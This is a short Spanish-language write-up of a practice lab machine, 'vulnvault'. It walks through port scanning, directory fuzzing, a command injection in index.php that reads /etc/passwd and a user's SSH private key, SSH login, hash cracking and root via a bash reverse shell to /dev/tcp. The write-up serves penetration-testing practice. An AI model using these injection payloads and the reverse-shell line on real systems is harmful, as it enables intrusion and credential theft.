### Maquina vulnvault

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

## Fuzzing web

gobuster dir -t 200 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

/scripts.js           
/upload.php           
/upload.html          
/upload.js            
/index.php            
/old                  


## Intrusion

Ejecución remota (RCE)

En index.php, podemos escribir ejecucion remota de comandos

; cat /etc/passwd
; cat /etc/passwd

![alt text](image-2.png)

aquí podemos ver el id_rsa y hacer la intrusión mediante el id_rsa

; cat /home/samara/.ssh/id_rsa


copiamos el id_rsa, le damos permisos 600 y accedemos mediante ssh

![alt text](image-4.png)


en /home/samara encontramos un archivo user.txt que contiene -> 030208509edea7480a10b84baca3df3e , es una encriptacion MD5

hash-identifier

![alt text](image-5.png)

aplicamos JohnTheRipper

![alt text](image-3.png)

## Escalar privilegios

ejecute pspy64

![alt text](image-6.png)

y vi que el archivo se ejecutaba como root y tenia permisos de escritura

luego agregue el siguiente codigo:

bash -i >& /dev/tcp/172.17.0.1/443 0>&1

me puse en escucha con netcat y listo somos root



##
##
